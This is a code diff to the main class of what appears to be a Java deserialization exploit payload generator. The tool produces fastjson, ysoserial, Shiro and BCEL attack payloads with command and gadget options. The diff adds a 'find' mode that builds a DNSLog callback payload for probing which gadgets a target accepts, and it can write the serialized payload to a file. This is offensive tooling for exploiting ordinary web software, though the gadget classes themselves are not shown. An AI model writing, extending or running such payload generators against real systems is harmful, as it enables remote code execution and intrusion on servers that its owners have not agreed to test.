@@ -4,6 +4,7 @@ import com.ding0x0.Generate;
 import com.ding0x0.Payload;
 import com.ding0x0.bootstrap.TypeErrorException;
 import com.ding0x0.fastjson.GenerateFastjsonPayload;
+import com.ding0x0.gadget.GenerateDNSLogPayload;
 import com.ding0x0.other.GenerateBCELPayload;
 import com.ding0x0.other.GenerateShiroPayload;
 import com.ding0x0.utils.Code;
@@ -11,6 +12,10 @@ import com.ding0x0.utils.Util;
 import com.ding0x0.yso.GenerateYsoPayload;
 import com.ding0x0.yso.Serializer;
 import com.ding0x0.utils.Enums.*;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.ObjectOutputStream;
 import java.util.*;
 import java.util.Base64.Encoder;
 
@@ -114,6 +119,8 @@ public class App {
             Object rawObj = null;
             Generate generate;
 
+            File file = null;
+
             switch (type){
                 case "fastjson":
                     if (!mTypeFlag){
@@ -155,8 +162,26 @@ public class App {
                         object = (Payload) generate.generatePayload();
                     }
                     break;
+                case "find":
+                    System.out.println("[+] dnslog to find gadget\n" +
+                            "-u  dnslog\n" +
+                            "-f  payload write to file");
+                    args = scanner.nextLine();
+                    HashMap<String, String> funcArgs2 = parserArgs(args.trim());
+                    if (args.equals("")){
+                        System.out.printf("plz input -d dnslog");
+                        System.exit(0);
+                    }
+                    String dnslog = funcArgs2.get("-u");
+                    String path = funcArgs2.getOrDefault("-f","null");
+                    if (!path.equals("null")){
+                        file = new File(path);
+                    }
+                    generate = new GenerateDNSLogPayload(dnslog);
+                    object = (Payload) generate.generatePayload();
+                    break;
                 case "shiro":
-                    System.out.println("[+] 生成shiro payload\n" +
+                    System.out.println("[+] shiro payload\n" +
                             "-g* shiro gadget\n" +
                             "-c command\n" +
                             "-d dirty data\n" +
@@ -210,8 +235,8 @@ public class App {
                     System.out.println("[+] generate bcel payload\n" +
                             "-lf local class file");
                     args = scanner.nextLine();
-                    HashMap<String, String> funcArgs2 = parserArgs(args);
-                    String lf = funcArgs2.getOrDefault("-lf", null);
+                    HashMap<String, String> funcArgs3 = parserArgs(args);
+                    String lf = funcArgs3.getOrDefault("-lf", null);
                     if (lf == null){
                         System.out.println("plz input local file path");
                         System.exit(1);
@@ -240,13 +265,22 @@ public class App {
 
             String[] encodeList = input.split(" ");
             rawObj = object.format();
-            if (input.trim().equals("") || input.trim().contains("-raw")){
-                if (!type.equals("yso")){
+            if (input.trim().equals("") || input.trim().contains("-raw") || input.trim().contains("raw")){
+                if (!type.equals("yso") && !type.equals("find")){
                     System.out.println("[*] success");
                     System.out.println(rawObj);
                 }else {
-                    rawObj = Serializer.serialize(rawObj);
-                    Serializer.serialize(rawObj, System.out);
+                    if (file!=null){
+                        FileOutputStream fileOutputStream = new FileOutputStream(file);
+                        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
+                        objectOutputStream.writeObject(rawObj);
+                        objectOutputStream.flush();
+                        System.out.printf("[*] success");
+                        System.out.printf("   ->  " + file.getAbsolutePath());
+                    }else {
+                        rawObj = Serializer.serialize(rawObj);
+                        Serializer.serialize(rawObj, System.out);
+                    }
                 }
                 break;
             }
